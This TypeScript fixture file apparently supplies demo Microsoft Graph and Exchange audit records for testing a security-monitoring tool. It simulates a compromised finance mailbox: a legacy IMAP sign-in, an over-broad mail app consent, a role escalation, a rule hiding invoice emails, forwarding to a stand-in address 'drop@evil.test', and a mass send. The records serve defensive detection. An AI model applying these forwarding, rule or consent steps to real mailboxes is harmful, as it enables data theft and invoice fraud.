import type { GraphTransport } from "./graph";

/** Recorded Graph-shaped pages for the demo tenant and fixture mode. Times are relative so a daily poll still sees them. */
export function demoRecords(now = Date.now()) {
  const iso = (hoursAgo: number) => new Date(now - hoursAgo * 3600_000).toISOString();
  const users = [
    { id: "user-finance", userPrincipalName: "finance@wattle.example", displayName: "Finance Mailbox", accountEnabled: true },
    { id: "user-reception", userPrincipalName: "reception@wattle.example", displayName: "Reception", accountEnabled: true },
  ];
  const devices = [
    { id: "device-laptop", deviceName: "WATTLE-LAPTOP", operatingSystem: "Windows", wiFiMacAddress: "aa:bb:cc:dd:ee:ff", lastSyncDateTime: iso(1), complianceState: "compliant" },
  ];
  const signIns = [
    { id: "si-legacy", userPrincipalName: "finance@wattle.example", userId: "user-finance", ipAddress: "203.0.113.10", createdDateTime: iso(5), clientAppUsed: "IMAP", location: { countryOrRegion: "US" }, status: { errorCode: 0 }, authenticationRequirement: "singleFactorAuthentication" },
    { id: "si-au", userPrincipalName: "finance@wattle.example", userId: "user-finance", ipAddress: "1.2.3.4", createdDateTime: iso(3), clientAppUsed: "Browser", location: { countryOrRegion: "AU" }, status: { errorCode: 0 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-us", userPrincipalName: "finance@wattle.example", userId: "user-finance", ipAddress: "198.51.100.20", createdDateTime: iso(2.5), clientAppUsed: "Browser", location: { countryOrRegion: "US" }, status: { errorCode: 0 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-mfa-1", userPrincipalName: "reception@wattle.example", userId: "user-reception", ipAddress: "198.51.100.30", createdDateTime: iso(1), clientAppUsed: "Mobile Apps and Desktop clients", location: { countryOrRegion: "AU" }, status: { errorCode: 500121 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-mfa-2", userPrincipalName: "reception@wattle.example", userId: "user-reception", ipAddress: "198.51.100.30", createdDateTime: iso(0.9), clientAppUsed: "Mobile Apps and Desktop clients", location: { countryOrRegion: "AU" }, status: { errorCode: 500121 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-mfa-3", userPrincipalName: "reception@wattle.example", userId: "user-reception", ipAddress: "198.51.100.30", createdDateTime: iso(0.8), clientAppUsed: "Mobile Apps and Desktop clients", location: { countryOrRegion: "AU" }, status: { errorCode: 500121 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-mfa-ok", userPrincipalName: "reception@wattle.example", userId: "user-reception", ipAddress: "198.51.100.30", createdDateTime: iso(0.7), clientAppUsed: "Mobile Apps and Desktop clients", location: { countryOrRegion: "AU" }, status: { errorCode: 0 }, authenticationRequirement: "multiFactorAuthentication" },
    { id: "si-ok", userPrincipalName: "reception@wattle.example", userId: "user-reception", ipAddress: "1.2.3.9", createdDateTime: iso(6), clientAppUsed: "Browser", location: { countryOrRegion: "AU" }, status: { errorCode: 0 }, authenticationRequirement: "multiFactorAuthentication" },
  ];
  const audits = [
    {
      id: "aud-consent",
      activityDateTime: iso(4),
      activityDisplayName: "Consent to application",
      initiatedBy: { user: { userPrincipalName: "finance@wattle.example" } },
      targetResources: [{ id: "grant-mail", displayName: "Invoice Helper", modifiedProperties: [{ displayName: "ConsentAction.Permissions", newValue: "Mail.Read Mail.Send" }] }],
    },
    {
      id: "aud-role",
      activityDateTime: iso(4.5),
      activityDisplayName: "Add member to role",
      initiatedBy: { user: { userPrincipalName: "finance@wattle.example" } },
      targetResources: [{ id: "user-finance", displayName: "Finance Mailbox", modifiedProperties: [{ displayName: "Role.DisplayName", newValue: "Exchange Administrator" }] }],
    },
  ];
  const exchange = [
    {
      Id: "ex-rule",
      CreationTime: iso(2),
      Operation: "New-InboxRule",
      UserId: "finance@wattle.example",
      UserKey: "user-finance",
      Parameters: [
        { Name: "SubjectContainsWords", Value: "invoice" },
        { Name: "DeleteMessage", Value: "True" },
        { Name: "Name", Value: "hide invoices" },
        { Name: "Identity", Value: "rule-hide-invoices" },
      ],
    },
    {
      Id: "ex-forward",
      CreationTime: iso(2.2),
      Operation: "Set-Mailbox",
      UserId: "finance@wattle.example",
      UserKey: "user-finance",
      Parameters: [{ Name: "ForwardingSmtpAddress", Value: "smtp:drop@evil.test" }],
    },
    {
      Id: "ex-mass",
      CreationTime: iso(1.5),
      Operation: "Send",
      UserId: "finance@wattle.example",
      UserKey: "user-finance",
      RecipientCount: 80,
    },
    {
      Id: "ex-benign",
      CreationTime: iso(1.2),
      Operation: "New-InboxRule",
      UserId: "reception@wattle.example",
      UserKey: "user-reception",
      Parameters: [
        { Name: "SubjectContainsWords", Value: "newsletter" },
        { Name: "MoveToFolder", Value: "News" },
      ],
    },
  ];
  return { users, devices, signIns, audits, exchange };
}

export function demoGraphTransport(now = Date.now()): GraphTransport {
  const data = demoRecords(now);
  return {
    async request(method, path) {
      if (method !== "GET") return { status: 204, headers: {}, body: {} };
      const p = path.split("?")[0] ?? path;
      if (p.endsWith("/auditLogs/signIns")) return { status: 200, headers: {}, body: { value: data.signIns } };
      if (p.endsWith("/auditLogs/directoryAudits")) return { status: 200, headers: {}, body: { value: data.audits } };
      if (p.endsWith("/users")) return { status: 200, headers: {}, body: { value: data.users } };
      if (p.includes("/deviceManagement/managedDevices")) return { status: 200, headers: {}, body: { value: data.devices } };
      if (p.includes("Audit.Exchange") || p.includes("activity/feed")) return { status: 200, headers: {}, body: { value: data.exchange } };
      if (p.includes("riskDetections")) return { status: 403, headers: {}, body: { error: { code: "Authorization_RequestDenied" } } };
      return { status: 200, headers: {}, body: { value: [] } };
    },
  };
}
